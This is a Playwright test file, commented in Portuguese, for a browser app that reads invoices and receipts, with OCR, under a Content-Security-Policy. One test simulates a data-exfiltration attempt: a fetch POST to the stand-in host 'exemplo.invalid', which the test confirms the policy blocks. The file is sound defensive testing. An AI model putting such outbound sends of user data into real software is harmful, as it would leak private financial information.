/* Site do GitHub Pages: o mesmo app servido por HTTP, com a Content-Security-Policy do empacotar.js --site.
   Confere que tudo funciona com a política ligada e que o navegador bloqueia qualquer envio de dados. */
const path = require('node:path');
const { test } = require('@playwright/test');
const { arquivosFicticios, vigiarErros, lerArquivos, telaSaudavel, visao, expect } = require('./ajuda');

const SITE = `http://localhost:${process.env.PORTA_SITE || 4173}/`;

test('site com CSP: lê faturas e notas, e não deixa nada sair do navegador', async ({ page }) => {
  const erros = vigiarErros(page);
  const fora = [];
  page.on('request', r => { if (!r.url().startsWith(SITE) && !/^(blob|data):/.test(r.url())) fora.push(r.url()); });
  await page.goto(SITE + 'index.html');
  await lerArquivos(page, arquivosFicticios());
  await expect(page.locator('#rx-resumo')).toContainText('3 faturas e 1 nota');
  await page.click('#rx-abrir-painel');
  await telaSaudavel(page, 'site');
  await visao(page, 'despesas');
  await telaSaudavel(page, 'site, despesas');
  // um script que tentasse mandar os dados para fora é barrado pela política
  const envio = await page.evaluate(async () => { try { await fetch('https://exemplo.invalid/', { method: 'POST', body: 'x' }); return 'enviou'; } catch (e) { return 'bloqueado'; } });
  expect(envio).toBe('bloqueado');
  erros.splice(0, erros.length, ...erros.filter(e => !/exemplo\.invalid|Content Security Policy/.test(e)));
  await page.goto(SITE + 'exemplo.html');
  await expect(page.locator('#rx-controles select')).toBeVisible();
  expect(fora.filter(u => !/exemplo\.invalid/.test(u))).toEqual([]);
  expect(erros).toEqual([]);
});

test('site com CSP: foto de cupom (OCR) funciona', async ({ page }) => {
  test.setTimeout(120_000);
  const erros = vigiarErros(page);
  await page.goto(SITE + 'index.html');
  await lerArquivos(page, [path.join(__dirname, '../.gerado/cupom-ficticio.png')]);
  await expect(page.locator('.rx-arq')).toContainText(/Nota · Mercadinho Exemplo/);
  await expect(page.locator('.rx-arq')).toContainText(/28,50/);
  expect(erros).toEqual([]);
});
